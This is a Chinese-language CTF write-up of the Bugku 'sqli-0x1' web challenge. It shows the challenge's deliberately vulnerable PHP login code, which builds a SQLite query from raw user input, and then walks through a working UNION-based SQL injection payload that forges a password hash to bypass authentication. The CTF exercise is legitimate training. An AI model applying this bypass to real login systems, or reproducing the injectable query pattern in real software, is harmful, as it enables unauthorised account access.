# [CTF-Web]sqli-0x1——bugku

MiracleWolf 2023-11-15 2711/15

# 一、题目链接

[bugku-Web-sqli-0x1](https://ctf.bugku.com/challenges/detail/id/406.html "sqli-0x1")

## 二、解法步骤

```
打开网址，查看网页源代码，发现提示：
```

[![[CTF-Web]sqli-0x1——bugku](http://47.98.239.98/wp-content/uploads/2023/11/47ASWO_O_EB34_B63SVP-1.png "[CTF-Web]sqli-0x1——bugku")](http://47.98.239.98/wp-content/uploads/2023/11/47ASWO_O_EB34_B63SVP-1.png)  
于是访问：得到网页php代码：  
首先看第一部分中的过滤函数：

```php
require_once("flag.php");
function is_trying_to_hak_me($str)
{
    $blacklist = ["' ", " '", '"', "`", " `", "` ", ">", "<"];//过滤符号
    if (strpos($str, "'") !== false) { //确保str中有单引号
        if (!preg_match("/[0-9a-zA-Z]'[0-9a-zA-Z]/", $str)) {
            return true;//确保str中有0-9数字或字母

    }
    foreach ($blacklist as $token) { //不能有被过滤的符号
        if (strpos($str, $token) !== false) return true;
    }
    return false;
}
```

这段过滤是比较鸡肋的，我们只需要确保str中有单引号和数字或字母即可，被过滤的符号中有："' "，这个和"'"是不同的，因此最后一层的过滤是无效的，  
接下来是第二部分

```php
if (isset($_POST["user"]) && isset($_POST["pass"]) && (!empty($_POST["user"])) && (!empty($_POST["pass"]))) {
    $user = $_POST["user"]; //$user接受传入user参数
    $pass = $_POST["pass"];//$pass接受传入pass参数
    if (is_trying_to_hak_me($user)) { //利用过滤函数进行过滤
        die("why u bully me");
    }

    $db = new SQLite3("/var/db.sqlite");//创建数据库
    $result = $db->query("SELECT * FROM users WHERE username='$user'");//查询传入数据库的$user
    if ($result === false) die("pls dont break me");//结果需要存在
    else $result = $result->fetchArray();//将查询结果构成一个关联数组

    if ($result) {
        $split = explode('$', $result["password"]);//将查询结果中的password字段中的内容按照$进行分割
        $password_hash = $split[0];//加密哈希设置为分割的第一部分
        $salt = $split[1];//偏移量设置为分割的第二部分
        if ($password_hash === hash("sha256", $pass.$salt)) $logged_in = true;//如果加密哈希等于输入的 password 和 salt 进行拼接，即可成功登陆
      else $err = "Wrong password";
    }
    else $err = "No such user";
}
```

```
到这里关键点是控制原密码的哈希加密结果，也就是想办法覆盖掉原密码，从而使得我们自己创建的密码能成功登陆。这里可使用联合注入的方式进行覆盖。
首先user=1'，然后生成自定义密码，根据加密逻辑，我们通过php生成密码为1，偏移量为1的Hash：
```

```php
echo (hash("sha256","1"."1"));
结果：4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8
```

这个密码需要以$分割，前一部分是需要比对的hash值，后一部分是偏移量，  
我们这个前一部分就是1，1在sha256下的加密结果，那么只需在末尾多加上`$1`，即设定偏移量为1，最后的密码$pass我们传入1即可。  
然后将user字段进行联合注入:  
payload`1'union/**/select/**/1,'4fc82b26aecb47d2868c4efbe3581732a3e7cbcc6c2efb32062c08170a05eeb8$1`。这里/**/是为了避免单引号后面的空格被过滤函数检查到，第一个单引号绕过用户名，联合查询使得两个查询结果被合并在一起，第二个单引号闭合前面password的查询结果，使得我们可以控制加密密文  
pass传入1  
最后得到flag:[![[CTF-Web]sqli-0x1——bugku](http://47.98.239.98/wp-content/uploads/2023/11/@LGJ8NOJA7DL_TSD5.png "[CTF-Web]sqli-0x1——bugku")](http://47.98.239.98/wp-content/uploads/2023/11/@LGJ8NOJA7DL_TSD5.png)

三、总结  
本题较为复杂，首先需要对代码进行审计，然后利用联合查询注入获取flag，挺有难度的。